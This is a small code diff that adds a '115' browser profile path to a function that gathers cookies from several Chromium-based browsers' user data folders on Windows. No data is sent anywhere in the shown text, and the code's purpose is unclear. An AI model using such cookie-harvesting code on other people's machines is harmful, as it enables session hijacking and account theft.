@@ -42,7 +42,8 @@ def get_browsers_cookies():
         'Chrome Canary': '/Google/Chrome SxS/User Data',
         'Chromium':      '/Google/Chromium/User Data',
         'Edge':          '/Microsoft/Edge/User Data',
-        'Vivaldi':       '/Vivaldi/User Data'
+        'Vivaldi':       '/Vivaldi/User Data',
+        '115':           '/115Chrome/User Data' 
     }
     LocalAppDataDir = os.getenv('LOCALAPPDATA')
     all_browser_cookies = []
